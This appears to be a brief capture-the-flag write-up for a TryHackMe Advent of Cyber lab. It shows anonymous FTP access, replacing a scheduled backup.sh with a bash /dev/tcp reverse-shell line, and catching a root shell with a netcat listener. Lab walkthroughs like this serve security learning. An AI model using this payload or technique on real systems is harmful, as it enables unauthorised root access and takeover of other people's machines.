connect to ftp server and with `anonymous` account and get files
```console
┌──(kali㉿kali)-[~/THM/adventofcyber/9]
└─$ cat shoppinglist.txt 
The Polar Express Movie
                                                                                                                        
┌──(kali㉿kali)-[~/THM/adventofcyber/9]
└─$ cat backup.sh       
#!/bin/bash

# Created by ElfMcEager to backup all of Santa's goodies!

# Create backups to include date DD/MM/YYYY
filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";

# Backup FTP folder and store in elfmceager's home directory
tar -zcvf /home/elfmceager/$filename /opt/ftp

# TO-DO: Automate transfer of backups to backup server
```
in general, backup is execute automatically after some period of time. so let try to put new backup.sh to the ftp server that contain a reverse shell
```console
└─$ cat backup.sh
#!/bin/bash
bash -i >& /dev/tcp/<ip>/6969 0>&1
```
now open nc and wait for reverse shell
```console
$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.120.20] 60378
bash: cannot set terminal process group (1732): Inappropriate ioctl for device
bash: no job control in this shell
root@tbfc-ftp-01:~# ls        
ls
flag.txt
root@tbfc-ftp-01:~# cat flag.txt
cat flag.txt
THM{______________________}
```
                                            